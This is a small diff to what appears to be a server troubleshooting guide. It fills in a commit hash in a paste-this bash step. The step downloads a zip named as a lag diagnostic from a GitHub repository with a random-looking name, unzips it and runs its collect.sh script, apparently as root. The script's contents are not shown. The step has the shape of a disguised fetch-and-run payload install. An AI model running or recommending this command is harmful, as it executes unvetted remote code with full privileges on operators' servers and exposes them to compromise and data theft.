@@ -45,7 +45,7 @@ spark health --upload
 
 ```bash
 cd /root/RW_GRIEF && \
-curl -fsSL -o /tmp/elytrix-lag-diag.zip https://raw.githubusercontent.com/propalvlimbo-dev/0sdfg079ynsd0f9bn780897/COMMIT_SHA_PLACEHOLDER/elytrix-lag-diag.zip && \
+curl -fsSL -o /tmp/elytrix-lag-diag.zip https://raw.githubusercontent.com/propalvlimbo-dev/0sdfg079ynsd0f9bn780897/5928b03c0c5f19aa2bb480adf5ae862be06d1546/elytrix-lag-diag.zip && \
 rm -rf /tmp/elytrix-lag-diag && unzip -oq /tmp/elytrix-lag-diag.zip -d /tmp/elytrix-lag-diag && \
 bash /tmp/elytrix-lag-diag/collect.sh 90
 ```
